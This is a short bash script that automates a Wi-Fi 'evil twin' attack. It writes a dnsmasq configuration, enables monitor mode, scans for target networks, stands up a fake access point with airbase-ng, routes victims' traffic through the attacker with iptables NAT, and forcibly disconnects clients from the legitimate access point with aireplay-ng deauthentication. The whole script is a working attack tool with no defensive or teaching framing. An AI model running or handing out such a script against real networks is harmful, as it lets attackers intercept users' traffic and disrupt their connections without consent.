#!/bin/bash

# Step 1: Update Aircrack-ng
sudo apt-get update && sudo apt-get upgrade -y

# Step 2: Install dnsmasq
sudo apt-get install -y dnsmasq

# Step 3: Create an "eviltwin" folder in Desktop
mkdir -p ~/Desktop/eviltwin
cd ~/Desktop/eviltwin

# Create dnsmasq.conf file
cat << EOF > dnsmasq.conf
interface=at0
dhcp-range=10.0.0.20,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
server=8.8.4.4
server=64.6.64.6
server=64.6.65.6
log-queries
log-dhcp
listen-address=127.0.0.1
port=5353
EOF

# Step 4: Enable Monitor Mode on Wireless Interface
sudo airmon-ng start wlan0

# Step 5: Locate the Target Wireless Network Using Airodump-ng
gnome-terminal -- airodump-ng wlan0mon

# Step 6: Create an Evil Twin or Fake AP Using Airbase-ng
gnome-terminal -- airbase-ng -e [network name] -c 11 wlan0mon

# Step 7: Configure Interface at0
sudo ifconfig at0 up
sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0
sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
sudo iptables -P FORWARD ACCEPT
sudo iptables -t nat -A POSTROUTING -o wlan0mon -j MASQUERADE
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# Step 8: Run dnsmasq
gnome-terminal -- dnsmasq -C ~/Desktop/eviltwin/dnsmasq.conf -d

# Step 9: Increase the Power of the Fake AP
# Replace wlan0mon with your wireless interface if different
# sudo iwconfig wlan0mon txpower 27

# Step 10: Kick Wireless Clients Off the Legitimate AP
# Replace [BSSID of real AP] with the BSSID of the target network
gnome-terminal -- aireplay-ng --deauth 50 -a [BSSID of real AP] wlan0mon
